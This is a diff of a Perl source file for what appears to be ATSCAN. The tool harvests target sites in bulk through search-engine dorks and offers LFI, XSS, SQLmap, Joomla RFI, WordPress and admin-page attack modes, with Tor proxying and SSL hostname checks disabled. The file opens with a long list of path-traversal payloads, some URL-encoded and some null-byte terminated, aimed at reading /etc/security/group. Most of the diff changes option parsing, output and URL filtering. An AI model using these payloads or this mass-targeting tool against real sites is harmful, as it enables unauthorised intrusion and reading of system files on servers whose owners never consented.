/../../../../../../etc/security/group","/etc/security/group%00","../etc/security/group%00","../../etc/security/group%00","../../../etc/security/group%00","../../../../etc/security/group%00","../../../../../etc/security/group%00","../../../../../../etc/security/group%00","../../../../../../../etc/security/group%00","../../../../../../../../etc/security/group%00","../../../../../../../../../etc/security/group%00","../../../../../../../../../../etc/security/group%00","%2Fetc%2Fsecurity%2Fgroup","..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","%2Fetc%2Fsecurity%2Fgroup%00","..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","%2F%2Fetc/security/group","....%2F%2Fetc/security/group","....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","%2F%2Fetc/security/group%00","....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","//etc/security/group","....//etc/security/group","....//....//etc/security/group","....//....//....//etc/security/group","....//....//....//....//etc/security/group","....//....//....//....//....//etc/security/group","....//....//....//....//....//....//etc/security/group","....//....//....//....//....//....//....//etc/security/group","....//....//....//....//....//....//....//....//etc/security/group","....//....//....//....//....//....//....//....//....//etc/security/group","....//....//....//....//....//....//....//....//....//....//etc/security/group","//etc/security/group%00","....//etc/security/group%00","....//....//etc/security/group%00","....//....//....//etc/security/group%00","....//....//....//....//etc/security/group%00","....//....//....//....//....//etc/security/group%00","....//....//....//....//....//....//etc/security/group%00","....//....//....//....//....//....//....//etc/security/group%00","....//....//....//....//....//....//....//....//etc/security/group%00","....//....//....//....//....//....//....//....//....//etc/security/group%00","....//....//....//....//....//....//....//....//....//....//etc/security/group%00");}
 
@@ -255,7 +254,6 @@ sub ZIP {@ZIP = ("/backup.tar.gz", "/backup/backup.tar.gz", "/backup/backup.zip"
 use Getopt::Long ();
 my $proxy;
 my $help;
-
 my $output;
 my $replace;
 my $with;
@@ -284,7 +282,6 @@ my $mwpsites;
 my $mjoomsites;
 my $mupload;
 my $mzip;
-my $string;
 my $mhttpd;
 my $command;
 my $mtarget;
@@ -297,9 +294,10 @@ my $mdecode64;
 my $mip;
 my $mserver;
 my $mmails;
+my $mnoshow;
 
 Getopt::Long::GetOptions(\my %OPT,
-                        'proxy' => \$proxy,
+                        'proxy=s' => \$proxy,
                         'help' => \$help,
                         'save=s' => \$output,
                         'dork=s' => \$dork,
@@ -326,7 +324,6 @@ Getopt::Long::GetOptions(\my %OPT,
 						'joom' => \$mjoomsites,
 						'upload' => \$mupload,
 						'zip' => \$mzip,
-						'st=s' => \$string,
 						'encode64' => \$mencode64,
 						'decode64' => \$mencode64,
 						'httpd' => \$mhttpd,
@@ -337,13 +334,13 @@ Getopt::Long::GetOptions(\my %OPT,
 						'about' => \$mabout,
 						'replace=s' => \$replace,
 						'with=s' => \$with,
-						'update' => \$checkversion,
 						'md5=s' => \$mmd5,
 						'encode64=s' => \$mencode64,
 						'decode64=s' => \$mdecode64,
 						'ip' => \$mip,
 						'server' => \$mserver,
 						'email' => \$mmails,
+						'hide' => \$mnoshow,
 ) or advise();
 
 if (@ARGV > 0){
@@ -378,7 +375,6 @@ if (@ARGV > 0){
 			'encode64',
 			'decode64',
 			'md5',
-			'st',
 			'httpd',
 			'command',
 			'TARGET',
@@ -391,27 +387,75 @@ if (@ARGV > 0){
 			'ip',
 			'server',
 			'email',
+			'hide',
   );
   
-  if (!exists $com{"save" || "help" || "proxy" || "dork" || "level" || "xss" || "valid" || "exp" || "sqlmap" || "lfi" || "joomrfi" || "shell" || "wpadf" || "admin" || "shost" || "ports" || "start" || "end" || "basic" || "all" || "sites" || "wp" || "joom" || "zip" || "upload" || "md5" || "decode64" || "encode64" || "st" || "httpd" || "command" || "TARGET" || "FULL_TARGET" || "isup" || "about" || "select" || "replace" || "ip" || "server" || "with" || "email"}) {
+  if (!exists $com{"save" || "help" || "proxy" || "dork" || "level" || "xss" || "valid" || "exp" || "sqlmap" || "lfi" || "joomrfi" || "shell" || "wpadf" || "admin" || "shost" || "ports" || "start" || "end" || "basic" || "all" || "sites" || "wp" || "joom" || "zip" || "upload" || "md5" || "decode64" || "encode64" || "httpd" || "command" || "TARGET" || "FULL_TARGET" || "isup" || "about" || "select" || "replace" || "ip" || "server" || "with" || "email" || "hide"}) {
 	advise();
   }
 }
 ##############################################################
-##############################################################
-
 ### set tor proxy
 if (defined $proxy) {
-  my $proxy="socks://localhost:9050";
+   if ($proxy =~ m/http:\/\//) {
+	$proxy =~ s/http:\/\///g;
+   }
+  if (($proxy !~ m/^[a-zA-Z0-9\.]+(?:\:\d+)/) || ($proxy !~ m/^[a-zA-Z0-9\.]+[a-zA-Z0-9]+(?:\:\d+)/)) {
+    print color 'bold';
+    print "[ ] ----------------------------------------------------------------------- [ ]\n";
+    print color 'RESET';
+    print color 'yellow';
+    print "[!] Proxy use <proxy>:<port>! [Ex:localhost:9050]\n";
+    print color 'RESET';
+	exit();
+  }
+  $ENV{HTTPS_PROXY} = $proxy;
+  $ENV{PERL_LWP_SSL_VERIFY_HOSTNAME} = 0; 
+  $ENV{HTTPS_DEBUG} = 1;
+  my $proxy="socks://$proxy";
   $ua->proxy([qw/ http https /] => $proxy);
   $ua->cookie_jar({});
 }
-
 ##############################################################
-##############################################################
-
-##############################################################
-##############################################################
+sub checkversion {
+  $versionck = "version.log";
+  if (!-e $versionck) {
+    print color 'red';
+	print "version.log not exists cannot check version! \n";
+	print color RESET;
+  }else{
+    my $URL = 'https://github.com/AlisamTechnology/ATSCAN/blob/master/version.log';
+    $request = HTTP::Request->new('GET', $URL);
+    my $response = $ua->request($request);
+	my $html = $response->content;
+	  
+    (my $gitversion) = ($html =~ /version(.*)Stable/);
+	if (defined $gitversion) {
+      $gitversion = "version".$gitversion."Stable";
+    }
+    open (TEXT, 'version.log');
+    while (my $existantversion = <TEXT>) { 
+	  chomp $existantversion;
+	  if (defined $gitversion) {
+	    if ($gitversion eq $existantversion) {
+	      print color 'green';
+	      print "OK! Last $gitversion!\n";
+	      print color RESET;
+	    }else{
+	      print color 'red';
+	      print "$existantversion Update Needed to ";
+	      print color RESET;
+	      print color 'green';
+	      print "$gitversion!\n";
+	      print color RESET;
+		}  
+	  }
+    }
+    close (TEXT);
+  }
+}
+###################################################################
+###################################################################		
 sub desclaimer {
   print "[ ] ----------------------------------------------------------------------- [ ]\n";
   print "[ ] This is a pentest tool! We will not be responsible or liable, directly  [ ]\n";
@@ -420,14 +464,15 @@ sub desclaimer {
   print "[ ] ----------------------------------------------------------------------- [ ]\n";
   osinfo();
 }
-
+###################################################################		
+###################################################################		
 sub timer {
   my ($sec,$min,$hr) = localtime();
   print "[!] [";
   print "$hr:$min:$sec";
   print "] ";
 }
-
+###################################################################		
 sub osinfo {
   use Config;
   print color 'bold yellow';
@@ -463,8 +508,11 @@ sub osinfo {
   print "$Config{archname}\n";
   print color RESET;
 }
-
+###################################################################		
 sub advise {
+  print color 'bold';
+  print "[ ] ----------------------------------------------------------------------- [ ]\n";
+  print color RESET;
   print color 'yellow';
   print "[!] Upss.. Invalid arguments! \n";
   print "[!] Simple Usage: ./",basename($0)," \n";
@@ -473,7 +521,7 @@ sub advise {
   print color RESET;
   exit;
 }
-
+###################################################################		
 sub forwait {
   print color RESET;
   print color 'bold';
@@ -486,7 +534,7 @@ sub forwait {
   progressbar();
   print color RESET;
 }
-
+###################################################################		
 sub progressbar {
   use utf8;
   $| = 1;
@@ -499,11 +547,11 @@ sub progressbar {
   }
   print" \n\n";
 }
-
+###################################################################		
 sub scandetail {
   if (defined $Target) {
     print color 'bold yellow';
-    print "[+] TARGET:: ";
+    print "[!] TARGET:: ";
     print color RESET;
     print color 'red';
     print "$Target ";
@@ -525,227 +573,166 @@ sub scandetail {
     print "No! \n";
     print color RESET;
   }
-  if ((defined $mmd5) || (defined $mdecode64) || (defined $mencode64)) {
-    print color 'bold yellow';
-    print "[+] DECRYPT:: ";
-    print color RESET;
-    print color 'red';
-	if (defined $mmd5) {
-      print "MD5\n";
-	}elsif (defined $mencode64) {
-      print "Encode Base64\n";
-	}elsif (defined $mdecode64) {
-      print "Decode Base64\n";
-	}
-    print color RESET;
-  }
-  if (defined $mlevel) {
-    print color 'bold yellow';
-    print "[+] SCAN LEVEL:: ";
-    print color RESET;
-    print color 'red';
-    print "$mlevel \n";
-    print color RESET;
-  }
-  if ((defined $mtarget) || (defined $replace) || (defined $with)) {
-    print color 'bold yellow';
-    print "[+] FILTER:: ";
-    print color RESET;
-    print color 'red';
-    if (defined $mtarget) {
-      print "Remove all parameters \n";
-    }elsif ((defined $replace) || (defined $with)){
-      print "Replace [$replace] with [$with]\n";
-	}
-    print color RESET;
-  }
-  if ((defined $sqlmap) || (defined $sqlmaptor)){
-    print color 'bold yellow';
-    print "[+] EXPLOIT:: ";
-    print color RESET;
-    print color 'red';
-    print "Sqlmap \n";
-    print color RESET;
-  }
-  
-  if ((defined $mxss) || (defined $mlfi) || (defined $mmails)){
-    print color 'bold yellow';
-
-    print "[+] SCAN:: ";
-    print color RESET;
-    print color 'red';
-    if (defined $mlfi) {
-      print "Lfi\n";
-    }elsif (defined $mxss) {
-      print "Xss\n";
-    }elsif (defined $mmails) {
-      print "E-mail Extraction\n";
-	}
-    print color RESET;
-  }  
-
-  if ((defined $validation_text) || (defined $misup) || (defined $mhttpd) ) {
+  #########################################
+  if ((defined $misup) || (defined $validation_text)) {
     print color 'bold yellow';
     print "[+] VALIDATION:: ";
     print color RESET;
     print color 'red';
     if (defined $validation_text) { 
-      print "$validation_text \n";
+      print "$validation_text ";
     }
     if (defined $misup) { 
-      print "HTTP/1.1 200\n";
-    }
-    if (defined $mhttpd) { 
-      print "Get Httpd Headers\n";
+      print "HTTP/1.1 200 ";
     }
     print color RESET;
+    print "\n";
   }
   
-  if (defined $exploit) {
-    print color 'bold yellow';
-    print "[+] EXPLOIT:: ";
-    print color RESET;
-    print color 'red';
-    print "$exploit \n";
-    print color RESET;
-  }
-  
-  if (defined $mwpsites) {
-    print color 'bold yellow';
-    print "[+] LIST:: ";
-    print color RESET;
-    print color 'red';
-    print "Server_sites_Scan.txt \n";
-    print color RESET;
-  }  
-
-  if ((defined $mjoomrfi) || (defined $mjoomsites) || (defined $mwpsites) || (defined $command) || (defined $mwpadf) || (defined $madmin) || (defined $mwpsites) || (defined $mjoomsites) || (defined $msubdomain) || (defined $mports) || (defined $mzip) || (defined $mupload)) {
-
+  if ((defined $mmd5) || (defined $mdecode64) || (defined $mencode64) || (defined $mtarget) || (defined $mfulltarget) || (defined $exploit) || (defined $replace)) {
     print color 'bold yellow';
     print "[+] EXPLOITATION:: ";
     print color RESET;
-
     print color 'red';
-    if (defined $mjoomrfi) {
-      print "Rfi Joomla \n";
+	if (defined $mmd5) {
+      print "MD5 ";
+	}
+	if (defined $mencode64) {
+      print "Encode Base64 ";
+	}
+	if (defined $mdecode64) {
+      print "Decode Base64 ";
+	}
+    if (defined $mtarget) {
+      print "Remove parameters ";
     }
-    if (defined $command) {
-      print "$command \n";
+	if ((defined $replace) && (defined $with)){
+      print "Replace  ";
+	}
+    if (defined $exploit){
+      print "Exploit ";
     }
-    if (defined $mwpadf) {
-      print "ADF Wordpress \n";
+    if (defined $mfulltarget){
+      print "All parameters ";
+    }
+    print color RESET;
+    print "\n";
+  }
+  if ((defined $mxss) || (defined $mlfi) || (defined $madmin) || (defined $mjoomrfi) || (defined $mwpadf) || (defined $mports) || (defined $mupload) || (defined $mzip) || (defined $mmails)){
+    print color 'bold yellow';
+    print "[+] SCAN:: ";
+    print color RESET;
+	
+    print color 'red';
+	if (defined $mxss) {
+      print "Xss ";
+    }
+    if (defined $mlfi) {
+      print "Lfi ";
     }
     if (defined $madmin) {
-      print "Get Admin Page \n";
+      print "Admin ";
     }
-    if (defined $msites) {
-      print "Get Server Sites \n";
+    if (defined $mjoomrfi) {
+      print "Rfi ";
     }
-    if (defined $msubdomain) {
-      print "Get Subdomains \n";
-    }
-    if (defined $mhttpd) {
-      print "Get Httpd Version\n";
-    }
-    if (defined $mwpsites) {
-      print "Get Worpress Sites\n";
-    }
-    if (defined $mjoomsites) {
-      print "Get Joomla Sites\n";
-    }
-    if (defined $mupload) {
-      print "Get Upload Files\n";
-    }
-    if (defined $mzip) {
-      print "Get Zip Files\n";
+    if (defined $mwpadf) {
+      print "Adf ";
     }
     if (defined $mports) {
       print "Ports ";
-      if (defined $mbasic) {
-	    print "Basic Scan ";
-      }
-      if (defined $mall) {
-        print "Complete Scan ";
-      }
-      if (defined $muser) {
-        print "Select Scan ";
-      }
-	  my $muser=$muser;
-	  my $mall=$mall;
-	  if ((defined $mbasic and $mbasic eq "udp") || (defined $mall and $mall eq "udp") || (defined $muser and $muser eq "udp")) {
-	    print "UDP ";
-	  }
-	  if ((defined $mbasic and $mbasic eq "tcp") || (defined $mall and $mall eq "tcp") || (defined $muser and $muser eq "tcp")) {
-	    print "TCP ";
-	  }
-      if (((defined $mbasic and $mbasic eq "udp+tcp") || (defined $mall and $mall eq "udp+tcp") || (defined $muser and $muser eq "udp+tcp")) || ((defined $mbasic and $mbasic eq "tcp+udp") || (defined $mall and $mall eq "tcp+udp") || (defined $muser and $muser eq "tcp+udp"))) {
-	    print "TCP + UDP";
-	  }
-      if ((defined $mstart) && (defined $mend)) {
-        print "[$mstart To $mend] ";
-      }
-      print color RESET;
-	  print "\n";
     }
-  }
-  if (defined $shell) {
+    if (defined $mupload) {
+      print "Upload ";
+    }
+    if (defined $mzip) {
+      print "Zip ";
+    }
+    if (defined $mmails) {
+      print "E-mails ";
+    }
+    print color RESET;
+	print "\n";
+  }  
+  if ((defined $mhttpd) || (defined $msites) || (defined $mwpsites) || (defined $mjoomsites) || (defined $msubdomain) || (defined $mip) || (defined $mserver)){
     print color 'bold yellow';
-    print "[+] SHELL:: ";
+    print "[+] GET:: ";
     print color RESET;
     print color 'red';
-    print "$shell \n";
-  }
-}
-
-##############################################################
-##############################################################
-sub checkversion {
-  $versionck = "version.log";
-  if (!-e $versionck) {
-    print color 'red';
-	print "version.log not exists cannot check version! \n";
-	print color RESET;
-  }else{
-    #my $URL = "http://www.google.com";
-   # $request = HTTP::Request->new('GET', $URL);
-    #my $response = $ua->request($request);
-	#my $html = $response->content;
-    #if ($response->is_success) {
-	
-    my $URL = 'http://github.com/AlisamTechnology/ATSCAN/blob/master/version.log';
-    $request = HTTP::Request->new('GET', $URL);
-    my $response = $ua->request($request);
-	my $html = $response->content;
-	  
-	  
-    (my $gitversion) = ($html =~ /version(.*)Stable/);
-    $gitversion = "version".$gitversion."Stable";
-  
-    open (TEXT, 'version.log');
-    while (my $existantversion = <TEXT>) { 
-	  chomp $existantversion;
-	  if ($gitversion eq $existantversion) {
-	    print color 'green';
-	    print "OK! Last $gitversion!\n";
-	    print color RESET;
-	  }else{
-	    print color 'red';
-	    print "$existantversion Update Needed to ";
-	    print color RESET;
-	    print color 'green';
-	    print "$gitversion!\n";
-	    print color RESET;
-	  }
+    if (defined $mhttpd) { 
+      print "Httpd Headers ";
     }
-    close (TEXT);
+    if (defined $msites) { 
+      print "Server sites ";
+    }
+    if (defined $mwpsites) { 
+      print "WP sites ";
+    }
+    if (defined $mjoomsites) { 
+      print "JOOM sites ";
+    }
+    if (defined $msubdomain) { 
+      print "Subdomains ";
+    }
+    if (defined $mip) { 
+      print "IP ";
+    }
+    if (defined $mserver) { 
+      print "Server ";
+    }
+    print color RESET;
+	print "\n";
   }
 }
+if (defined $shell) {
+  print color 'bold yellow';
+  print "[+] SHELL:: ";
+  print color RESET;
+  print color 'red';
+  print "$shell \n";
+  print color RESET;
+}
+if (defined $mlevel) {
+  print color 'bold yellow';
+  print "[+] SCAN LEVEL:: ";
+  print color RESET;
+  print color 'red';
+  print "$mlevel \n";
+  print color RESET;
+}
+if ((defined $mcommand) || (defined $sqlmap)){
+  print color 'bold yellow';
+  print "[+] EXTERN CMD:: ";
+  print color RESET;
+  print color 'red';
+  if (defined $mcommand){
+    print "Command ";
+  }
+  if (defined $sqlmap){
+    print "Sqlmap ";
+  }
+  print "\n";
+  print color RESET;
+}
+if (defined $noshow){
+  print color 'bold yellow';
+  print "[+] EXTRAT:: ";
+  print color RESET;
+  print color 'red';
+  print "Hide process ";
+  print "\n";
+  print color RESET;
+}
 
+##############################################################
 sub testconection {
   my $URL = "http://www.google.com";
   $request = HTTP::Request->new('GET', $URL);
   $response = $ua->request($request);
   if ( !$response->is_success ) {
+    print color 'bold';
+    print "[ ] ----------------------------------------------------------------------- [ ]\n";
+    print color 'RESET';
     print color 'red';
     print "[!] Upss.. Your Internet connection seems not active!\n";
     print "[!] Check Your Connection OR Proxy Setting!\n";
@@ -753,7 +740,7 @@ sub testconection {
 	exit();
   }
 }
-
+###################################################################		
 sub dorklist {
   $checkdorklist = "dorks.txt";
   if (-e $checkdorklist){ unlink 'dorks.txt'};
@@ -810,7 +797,6 @@ sub dorklist {
     }
   }
 }
-
 sub targetlist {
   if (defined $Target) {
     my $pattern = '.txt|.log';
@@ -840,8 +826,20 @@ sub targetlist {
     }
   }
 }
-
-
+###################################################################	
+sub checkurltype{
+  $URL=$_[0];
+  if ($URL=~m/(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})/ && ($1<=255 && $2<=255 && $3<=255 && $4<=255 )){
+	print "[ ] ----------------------------------------------------------------------- [ ]\n";
+    print color 'red';
+	print "[!] $URL is an IP [Use: -t <ip> --level 20 <opcion>]! \n";
+    print color RESET;
+    exit();
+  }else{
+    return $URL;
+  }
+}	
+###################################################################		
 sub countdorks {
   my $lc = 0;
   my $file = $dork;
@@ -852,7 +850,7 @@ sub countdorks {
   print color RESET;
   close $file;
 }
-
+###################################################################		
 sub countinicialtargets {
   my $lc = 0;
   my $file = $Target;
@@ -863,15 +861,42 @@ sub countinicialtargets {
   print color RESET;
   close $file;
 }
+###################################################################		
 sub countsearchlist {
+  my $lc = 0;
   open $file, "<", "search.txt";
   $lc++ while <$file>;
-  return $lc;
+  print "$lc"; 
+  close $file;
 }
 
-###################################################################		
-###################################################################		
-sub finmodule {  
+###################################################################
+sub control {
+  $URL=$_[0];
+  if (defined $mfulltarget) {
+    $URL=~s/&(.*)/\ /g;
+  }
+  if (defined $mtarget) {
+	$URL =~ s/\/.*//s;
+  }
+  if ((defined $replace) && (defined $with)) {
+    if ($URL =~ m/$replace/i) {
+	  $URL =~ s/$replace(.*)/$with/s;
+	}
+  }
+  if (defined $exploit) {
+    $URL = $URL.$exploit;
+  }
+  $URL =~ s/ //g;
+  return $URL;
+}	
+###################################################################	
+sub getlist {
+  if (defined $output) { my $output = $output;}
+  else{ my $output = "scan.txt"; }
+}
+###################################################################
+sub finmodule {
   $list = "scan.txt";
   if (-e $list){  
     print" \n";
@@ -895,31 +920,39 @@ sub finmodule {
     print "[!] $lc Unique Result(s) Found!\n";
 	print color RESET;
     close $file;
-	
-	if (!defined $sqlmap) {
-      print color 'green';
-	  if (defined $output) {
-	    $listme = "scan.txt";
-        use File::Copy qw(copy);
-	    copy $listme, $output;
-	    unlink 'scan.txt';
-	    unlink 'search.txt';
-        print "[!] Results saved in $Bin/$output\n";
-	  }else{
-        print "[!] Results saved in $Bin/scan.txt\n";
-	  }
-      print color RESET;
-      print color 'red';
-	  timer();
-      print "SCAN FINISHED!\n";
-      print color RESET;
+    if (defined $output) {
+	  use File::Copy qw(copy);
+      copy 'scan.txt', getlist();
 	}
+	$zatr= getlist();
+    print color 'green';
+    print "[!] Results saved in $Bin/$zatr!\n";
+	print color RESET;
+    print color RESET;
+    print color 'red';
+	timer();
+    print "SCAN FINISHED!\n";
+    print color RESET;
+	  
   }else{
     negative();
-  }	
+  }
+  unlink 'serach.txt';
+  exit();
 }
 
 ###################################################################		
+sub fincontinuemodule {
+  my $lc = 0;
+  open $file, "<", "scan.txt";
+  $lc++ while <$file>;
+  print color 'green';
+  print "[!] [$lc Target(s) Found!]\n";
+  print color RESET;
+  close $file;
+  unlink 'scan.txt' if !defined $sqlmap;
+}
+
 ###################################################################		
 sub negative {	
   print color 'red';
@@ -939,9 +972,9 @@ sub submsearch {
   dorklist();
   msearch();
 }
+###################################################################		
 ## bgn sub msearch
 sub msearch {
-    
   my @strings=('fr', 'it', 'ie', 'us', 'br', 'ma', 'dz', 'se', 'nl', 'il', 'ca', 'pt', 'pl', 'eg', 'tn', 'ae', 'qa', 'af', 'iq', 'ch', 'mx', 've', 'es', 'ro', 'ru', 'jp', 'id', 'de', 'ua', 'sa', 'ok', 'fi', 'no', 'cz', 'lu', 'uy');
   $myrand = $strings[int rand @strings];
   scandetail();
@@ -975,7 +1008,7 @@ sub msearch {
   }
   if ((defined $mip) || (defined $mserver)){
     print color 'bold yellow';
-    print "[+] INFO:: ";
+    print "    INFO:: ";
     print color RESET;
     print color 'red';
 	if (defined $mip){
@@ -1005,6 +1038,7 @@ sub msearch {
       print color RESET;
 	}
 	$mlevel = $mlevel;
+
     $s_results = $dork;
 	if (defined $Target){
       $s_results = "ip%3A".$dork;
@@ -1022,110 +1056,64 @@ sub msearch {
           if($1 !~ /msn|live|bing|exploit4arab|pastebin|microsoft|WindowsLiveTranslator|youtube|google|cache|74.125.153.132|inurl:|q=|404|403|Time|out|Network|Failed|adw.sapo|tripadvisor|yandex/){
             my $URL=$1;
             $URL=~s/&(.*)/\ /g;
-			if ((defined $madmin) || (defined $mjoomrfi) || (defined $mwpadf) || (defined $msubdomain) || (defined $mwpsites) || (defined $mjoomsites) || (defined $mtarget) ){
-			  $URL =~ s/\/.*//s;
-			}elsif (defined $mfulltarget) {
-              $URL=~s/&(.*)/\ /g;
-			}elsif (defined $mlfi) {
-			  $URL =~ s/=.*/=/s;
-			}elsif (defined $Target) {
-		      if($URL !~ /http:\/\//) { $URL = "$URL"; }
-			  if($URL =~ m/www./i) {$URL =~ s/www.//g; }
-			  $URL =~ s/\/.*//s;
-			}elsif ((!defined $Target) && (((defined $replace) && (defined $with)) && ($URL =~ m/$replace/i))) {
-			  $URL =~ s/$replace(.*)/$with/s;
-			}else{
-              $URL=~s/&(.*)/\ /g;
-			}
-			if ((defined $mip) || (defined $mserver)) {
-			  print color 'bold yellow';
-			  print "[!] TARGET: ";
-	          print color RESET;
-	          print color 'green';
-              print "$URL\n";
-	          print color RESET;
-			  print color 'bold yellow';
-	          print "[+] INFO:   ";
-	          print color RESET;	
-			  if (defined $mip) {
-			    use Socket;
-                my $checkip=$URL;	 
-                $checkip=~ s/\/.*//s;
-                $ip = inet_ntoa(inet_aton($checkip));
-                print "IP: $ip ";
-			  }
-			  if (defined $mserver) {
-			    if($URL !~ /http:\/\//) { $URL = "http://$URL"; };
-			    $request = HTTP::Request->new('GET', $URL);
-                my $response = $ua->request($request);
-			    print "Server: ";
-			    if ($response->is_success) {
-                  $serverheader = $response->server;
-                  if (defined($serverheader)) {
-                    printf("%s", $response->server, " ");
-                  }else{ printf("Undefined"); }
-                }else{
-				  printf("%s", $response->status_line);
-				}
-			  }
-		      print "\n[ ]............................................................................ \n";
+			if (defined $Target) { $URL=~s/\/.*//s; }
+			if ($repeat{$URL}) {
 			}else{
 	          if ((!defined $mxss) && (!defined $exploit) && (!defined $mlfi) && (!defined $misup) && (!defined $validation_text) && (!defined $sqlmap) && (!defined $sqlmaptor) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $mports) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mhttpd) && (!defined $replace) && (!defined $with) && (!defined $mmails)) {
-			    print color 'bold yellow';
+	            print color 'bold yellow';
 			    print "[!] TARGET: ";
 	            print color RESET;
 	            print color 'green';
-                print "$URL\n";
+                print "http://$URL\n";
 	            print color RESET;
-			    if (defined $mip) {
-			      use Socket;
-                  my $checkip=$URL;	 
-                  $checkip=~ s/\/.*//s;
-                  $ip = inet_ntoa(inet_aton($checkip));
+				if ((defined $mip) || (defined $mserver)){
                   print color 'bold yellow';
 	              print "[+] INFO:   ";
 	              print color RESET;	
-                  print "IP: $ip ";
-			    }
-			    if (defined $mserver) {
-			      if($URL !~ /http:\/\//) { $URL = "http://$URL"; };
-			      $request = HTTP::Request->new('GET', $URL);
-                  my $response = $ua->request($request);
-			      print "Server: ";
-			      if ($response->is_success) {
-                    $serverheader = $response->server;
-                    if (defined($serverheader)) {
-                      printf("%s", $response->server, " ");
-                    }else{ printf("Undefined"); }
-                  }else{
-				    printf("%s", $response->status_line);
-				  }
+
+			      if (defined $mip) {
+			        use Socket;
+                    my $checkip=$URL;	 
+                    $checkip=~ s/\/.*//s;
+                    $ip = inet_ntoa(inet_aton($checkip));
+                    print "IP: $ip ";
+			      }
+			      if (defined $mserver) {
+			        if($URL !~ /http:\/\//) { $URL = "http://$URL"; };
+			        $request = HTTP::Request->new('GET', $URL);
+                    my $response = $ua->request($request);
+			        print "Server: ";
+			        if ($response->is_success) {
+                      $serverheader = $response->server;
+                      if (defined($serverheader)) {
+                        printf("%s", $response->server, " ");
+                      }else{ 
+					    printf("Undefined"); 
+					  }
+                    }else{
+				      printf("%s", $response->status_line, " ");
+				    }
+			      }
+				  print "\n";
 			    }
 		        print "[ ]............................................................................ \n";
 			  }
+              open (TEXT, '>>search.txt');
+			  if (defined $replace) {
+			    if ($URL =~ m/$with/i) {
+			      print TEXT "http://$URL\n";
+		        }	
+			  }else{
+                print TEXT "http://$URL\n";
+			  }
+              close (TEXT);
+			  $repeat{$URL}++;
 			}
-            open (TEXT, '>>search.txt');
-			if (defined $replace) {
-			  if ($URL =~ m/$with/i) {
-			    print TEXT "$URL\n";
-		      }	
-			}else{
-              print TEXT "$URL\n";
-			}
-            close (TEXT);
           }
         }
       }
     }   
   }
-  open $file, "<", "search.txt";
-  $lc++ while <$file>;
-  print color 'yellow';
-  print "[!] $lc Total Scan Result(s) Found!\n";
-  print color RESET;
-  close $file;
-  print color RESET;
-
   $list = "search.txt";
   if (-e $list){
     print" \n";
@@ -1141,7 +1129,6 @@ sub msearch {
         print;
         close (TEXT);
 		unlink "search.txt.bac";
-		unlink "dorks.txt";
       }
     }
     open $file, "<", "search.txt";
@@ -1151,6 +1138,7 @@ sub msearch {
 	print color RESET;
 	close $file;
     print color RESET;
+	
